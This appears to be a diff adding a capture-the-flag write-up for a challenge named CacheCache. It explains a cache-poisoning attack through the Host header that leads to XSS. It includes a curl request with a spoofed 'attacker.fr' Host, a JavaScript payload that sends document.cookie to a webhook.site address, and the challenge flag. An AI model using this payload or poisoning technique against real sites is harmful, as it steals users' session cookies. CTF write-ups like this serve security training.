@@ -1,5 +1,23 @@
+Write-up of CacheCache
+
 There are vulnerabilities present in the code due to cache poisoning and Cross-Site Scripting (XSS) attacks originating from the Host header. The vulnerabilities arise from the following lines of code
 
-[1](https://media.discordapp.net/attachments/1233418958497910794/1236467450757906472/Capture_decran_2024-05-05_020003.png?ex=66381d8c&is=6636cc0c&hm=cc95137f4e1bc5ca039cac1154f5a43be95d7c3a7e2f4772604f273e2a0f6fd2&=&format=webp&quality=lossless)
+@cache.cached(timeout=60, make_cache_key=make_key)
+<script src="http://{request.headers.get('Host')}/script/main.js"></script>
 
 The make_key function determines the cache key, which can be influenced by a GET parameter named cachekey. Here's the function
+
+def make_key():
+    cachekey = request.args.get("cachekey")
+    return cachekey if cachekey else ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+
+Exploiting these vulnerabilities involves sending a curl request to change the host from which the script is loaded and utilizing a custom cache key for cache poisoning. Here's the curl request
+
+$ curl "http://challenge.midnightflag.fr:10110/?cachekey=worty" -H "Host: attacker.fr"
+
+Additionally, on the server, a script needs to be hosted at /script/main.js with the following content
+
+fetch("https://webhook.site/[UUID]/?data="+btoa(document.cookie));
+
+This script sends the victim's cookies to a specified webhook site. The flag for this vulnerability is ....
+MCTF{c4ch3_p0is0ning_t0_xss}
